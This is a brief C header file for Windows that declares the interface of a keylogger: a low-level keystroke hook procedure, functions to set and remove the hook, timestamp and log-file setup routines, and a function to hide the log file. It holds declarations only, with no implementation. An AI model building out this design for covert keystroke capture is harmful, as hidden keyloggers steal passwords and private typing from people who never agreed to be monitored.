#ifndef LOGGER_H
#define LOGGER_H

#include <windows.h>

// Keylogging hook that logs low level keystrokes
LRESULT KeylogProc(int nCode, WPARAM wparam, LPARAM lparam);

int setKeylogHook();

void writeTimestampToLogFile();

void hideLogFile();

void initLogFile();

int removeKeylogHook();

#endif